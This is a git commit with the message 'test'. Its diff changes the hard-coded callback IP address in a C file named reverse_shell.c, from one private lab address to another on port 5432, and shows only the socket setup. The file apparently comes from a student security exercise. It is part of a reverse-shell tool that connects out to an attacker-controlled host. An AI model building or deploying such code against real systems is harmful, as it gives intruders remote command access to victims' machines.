ea4da0293159111273032a50e4a4db8b1e6c5ef8
Thomas SEMBELY <thsembel@e1r13p5.clusters.42paris.fr>
2022-05-02 17:31:24 +0200

    test

--- reverse_shell.c
+++ reverse_shell.c
@@ -14,7 +14,7 @@ int main(int argc, char *argv[])
     int s;
 
     sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = inet_addr("192.168.56.122");
+    sa.sin_addr.s_addr = inet_addr("192.168.56.102");
     sa.sin_port = htons(5432);
 
     s = socket(AF_INET, SOCK_STREAM, 0);
